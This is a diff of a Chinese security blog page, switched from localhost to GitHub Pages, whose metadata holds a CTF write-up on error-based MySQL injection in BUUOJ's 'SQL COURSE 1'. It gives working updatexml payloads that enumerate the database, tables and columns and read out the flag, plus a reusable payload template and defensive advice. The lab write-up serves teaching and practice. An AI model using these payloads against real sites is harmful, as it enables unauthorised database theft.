@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto" data-theme="auto">
 
-<head><script src="/san-blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=san-blog/livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>[BUUOJ] SQL COURSE 1 | 东阳的安全笔记</title>
 <meta name="keywords" content="CTF, Web安全, SQL注入, 报错注入, BUUOJ">
 <meta name="description" content="题目信息
@@ -39,16 +39,16 @@ id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(flag) from 目标表�
 
 updatexml 的报错输出有长度限制（约 32 字符），如果 flag 较长，需要用 substr() 分段读取。">
 <meta name="author" content="东阳">
-<link rel="canonical" href="http://localhost:1313/san-blog/posts/buu-sql-course-1/">
+<link rel="canonical" href="https://Samantha09.github.io/san-blog/posts/buu-sql-course-1/">
 <link crossorigin="anonymous" href="/san-blog/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/san-blog/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/san-blog/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/san-blog/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/san-blog/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/san-blog/safari-pinned-tab.svg">
+<link rel="icon" href="https://Samantha09.github.io/san-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://Samantha09.github.io/san-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://Samantha09.github.io/san-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://Samantha09.github.io/san-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://Samantha09.github.io/san-blog/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/san-blog/posts/buu-sql-course-1/">
+<link rel="alternate" hreflang="en" href="https://Samantha09.github.io/san-blog/posts/buu-sql-course-1/">
 <noscript>
     <style>
         #theme-toggle,
@@ -94,13 +94,97 @@ updatexml 的报错输出有长度限制（约 32 字符），如果 flag 较长
         document.querySelector("html").dataset.theme = 'light';
     }
 
+</script><meta property="og:url" content="https://Samantha09.github.io/san-blog/posts/buu-sql-course-1/">
+  <meta property="og:site_name" content="东阳的安全笔记">
+  <meta property="og:title" content="[BUUOJ] SQL COURSE 1">
+  <meta property="og:description" content="题目信息 类型：Web / SQL 注入 靶场：BUUOJ 核心漏洞：报错注入（Error-based SQL Injection） 目标：通过报错注入读取数据库中的 flag 漏洞分析 页面存在 SQL 注入点，输入单引号后数据库返回报错信息。通过 updatexml() 函数构造报错，可以将查询结果带出。
+利用步骤 1. 确认报错注入 构造 payload 测试报错注入是否可行：
+id=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23 回显中出现 ~geek~，确认当前数据库名为 geek。
+2. 查表名 从 information_schema.tables 中查询当前库的所有表名：
+id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23 3. 查列名 锁定目标表后，查询表中的列名：
+id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;目标表名&#39;),0x7e),1)%23 4. 读取 flag 拿到列名后，直接查询 flag 字段：
+id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(flag) from 目标表名),0x7e),1)%23 updatexml 的报错输出有长度限制（约 32 字符），如果 flag 较长，需要用 substr() 分段读取。">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-06-01T22:00:00+08:00">
+    <meta property="article:modified_time" content="2026-06-01T22:00:00+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Web安全">
+    <meta property="article:tag" content="SQL注入">
+    <meta property="article:tag" content="报错注入">
+    <meta property="article:tag" content="BUUOJ">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="[BUUOJ] SQL COURSE 1">
+  <meta name="twitter:description" content="题目信息 类型：Web / SQL 注入 靶场：BUUOJ 核心漏洞：报错注入（Error-based SQL Injection） 目标：通过报错注入读取数据库中的 flag 漏洞分析 页面存在 SQL 注入点，输入单引号后数据库返回报错信息。通过 updatexml() 函数构造报错，可以将查询结果带出。
+利用步骤 1. 确认报错注入 构造 payload 测试报错注入是否可行：
+id=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23 回显中出现 ~geek~，确认当前数据库名为 geek。
+2. 查表名 从 information_schema.tables 中查询当前库的所有表名：
+id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23 3. 查列名 锁定目标表后，查询表中的列名：
+id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;目标表名&#39;),0x7e),1)%23 4. 读取 flag 拿到列名后，直接查询 flag 字段：
+id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(flag) from 目标表名),0x7e),1)%23 updatexml 的报错输出有长度限制（约 32 字符），如果 flag 较长，需要用 substr() 分段读取。">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://Samantha09.github.io/san-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "[BUUOJ] SQL COURSE 1",
+      "item": "https://Samantha09.github.io/san-blog/posts/buu-sql-course-1/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[BUUOJ] SQL COURSE 1",
+  "name": "[BUUOJ] SQL COURSE 1",
+  "description": "题目信息 类型：Web / SQL 注入 靶场：BUUOJ 核心漏洞：报错注入（Error-based SQL Injection） 目标：通过报错注入读取数据库中的 flag 漏洞分析 页面存在 SQL 注入点，输入单引号后数据库返回报错信息。通过 updatexml() 函数构造报错，可以将查询结果带出。\n利用步骤 1. 确认报错注入 构造 payload 测试报错注入是否可行：\nid=1\u0026#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23 回显中出现 ~geek~，确认当前数据库名为 geek。\n2. 查表名 从 information_schema.tables 中查询当前库的所有表名：\nid=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23 3. 查列名 锁定目标表后，查询表中的列名：\nid=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;目标表名\u0026#39;),0x7e),1)%23 4. 读取 flag 拿到列名后，直接查询 flag 字段：\nid=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(flag) from 目标表名),0x7e),1)%23 updatexml 的报错输出有长度限制（约 32 字符），如果 flag 较长，需要用 substr() 分段读取。\n",
+  "keywords": [
+    "CTF", "Web安全", "SQL注入", "报错注入", "BUUOJ"
+  ],
+  "articleBody": "题目信息 类型：Web / SQL 注入 靶场：BUUOJ 核心漏洞：报错注入（Error-based SQL Injection） 目标：通过报错注入读取数据库中的 flag 漏洞分析 页面存在 SQL 注入点，输入单引号后数据库返回报错信息。通过 updatexml() 函数构造报错，可以将查询结果带出。\n利用步骤 1. 确认报错注入 构造 payload 测试报错注入是否可行：\nid=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23 回显中出现 ~geek~，确认当前数据库名为 geek。\n2. 查表名 从 information_schema.tables 中查询当前库的所有表名：\nid=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23 3. 查列名 锁定目标表后，查询表中的列名：\nid=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='目标表名'),0x7e),1)%23 4. 读取 flag 拿到列名后，直接查询 flag 字段：\nid=1' and updatexml(1,concat(0x7e,(select group_concat(flag) from 目标表名),0x7e),1)%23 updatexml 的报错输出有长度限制（约 32 字符），如果 flag 较长，需要用 substr() 分段读取。\n关键 Payload 模板 1' and updatexml(1,concat(0x7e,(select 查询语句),0x7e),1)%23 目的 查询语句 数据库名 database() 表名 group_concat(table_name) from information_schema.tables where table_schema=database() 列名 group_concat(column_name) from information_schema.columns where table_name='...' 数据 group_concat(flag) from ... 总结 本题是典型的 MySQL 报错注入，核心利用链：\n单引号闭合原有 SQL 语句 利用 updatexml(1, concat(0x7e, payload, 0x7e), 1) 构造 XPath 语法错误 数据库将子查询结果拼入报错信息回显 通过 %23（#）注释掉后面内容，避免语法错误 防御建议：\n使用参数化查询（Prepared Statements），彻底避免 SQL 注入 生产环境关闭数据库报错回显 对特殊字符进行转义或过滤 最小权限原则，应用数据库账号只赋予必要的查询权限 ",
+  "wordCount" : "128",
+  "inLanguage": "en",
+  "datePublished": "2026-06-01T22:00:00+08:00",
+  "dateModified": "2026-06-01T22:00:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "东阳"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://Samantha09.github.io/san-blog/posts/buu-sql-course-1/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "东阳的安全笔记",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://Samantha09.github.io/san-blog/favicon.ico"
+    }
+  }
+}
 </script>
 </head>
 <body id="top">
     <header class="header">
     <nav class="header-nav">
         <div class="logo">
-            <a href="http://localhost:1313/san-blog/" accesskey="h" title="东阳的安全笔记 (Alt + H)">东阳的安全笔记</a>
+            <a href="https://Samantha09.github.io/san-blog/" accesskey="h" title="东阳的安全笔记 (Alt + H)">东阳的安全笔记</a>
             <div class="logo-switches">
                 <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
@@ -126,27 +210,27 @@ updatexml 的报错输出有长度限制（约 32 字符），如果 flag 较长
         </div>
         <ul id="menu" class="menu">
             <li>
-                <a href="http://localhost:1313/san-blog/" title="首页">
+                <a href="https://Samantha09.github.io/san-blog/" title="首页">
                     <span>首页</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/posts/" title="文章">
+                <a href="https://Samantha09.github.io/san-blog/posts/" title="文章">
                     <span>文章</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/tags/" title="标签">
+                <a href="https://Samantha09.github.io/san-blog/tags/" title="标签">
                     <span>标签</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/categories/" title="分类">
+                <a href="https://Samantha09.github.io/san-blog/categories/" title="分类">
                     <span>分类</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/archives/" title="归档">
+                <a href="https://Samantha09.github.io/san-blog/archives/" title="归档">
                     <span>归档</span>
                 </a>
             </li>
@@ -261,18 +345,18 @@ updatexml 的报错输出有长度限制（约 32 字符），如果 flag 较长
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:1313/san-blog/tags/ctf/">CTF</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/web%E5%AE%89%E5%85%A8/">Web安全</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/sql%E6%B3%A8%E5%85%A5/">SQL注入</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">报错注入</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/buuoj/">BUUOJ</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/ctf/">CTF</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/web%E5%AE%89%E5%85%A8/">Web安全</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/sql%E6%B3%A8%E5%85%A5/">SQL注入</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">报错注入</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/buuoj/">BUUOJ</a></li>
     </ul>
 <nav class="paginav">
-  <a class="prev" href="http://localhost:1313/san-blog/posts/githack-git-leak-exploit/">
+  <a class="prev" href="https://Samantha09.github.io/san-blog/posts/githack-git-leak-exploit/">
     <span class="title">« Prev</span>
     <span>GitHack 工具使用与 .git 泄露利用详解</span>
   </a>
-  <a class="next" href="http://localhost:1313/san-blog/posts/upload-labs-linux-pass01/">
+  <a class="next" href="https://Samantha09.github.io/san-blog/posts/upload-labs-linux-pass01/">
     <span class="title">Next »</span>
     <span>[DASCTF] Upload-Labs-Linux Pass-01</span>
   </a>
@@ -283,7 +367,7 @@ updatexml 的报错输出有长度限制（约 32 字符），如果 flag 较长
     </main>
     
 <footer class="footer">
-        <span>&copy; 2026 <a href="http://localhost:1313/san-blog/">东阳的安全笔记</a></span> · 
+        <span>&copy; 2026 <a href="https://Samantha09.github.io/san-blog/">东阳的安全笔记</a></span> · 
 
     
     
